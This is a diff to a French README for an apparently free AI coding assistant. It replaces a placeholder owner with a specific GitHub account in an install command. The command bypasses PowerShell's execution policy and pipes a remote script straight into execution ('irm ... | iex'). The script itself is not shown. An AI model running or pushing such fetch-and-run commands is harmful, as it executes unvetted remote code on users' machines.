@@ -11,7 +11,7 @@ Assistant de codage IA gratuit basé sur l'interface de chat, avec le modèle **
 Ouvre un **invite de commandes (cmd)** et colle :
 
 ```cmd
-powershell -NoProfile -ExecutionPolicy Bypass -c "irm https://raw.githubusercontent.com/OWNER/servathub/main/install.ps1 | iex"
+powershell -NoProfile -ExecutionPolicy Bypass -c "irm https://raw.githubusercontent.com/tiktokservat7-stack/servathub/main/install.ps1 | iex"
 ```
 
 Puis **ouvre un nouveau cmd** et tape :
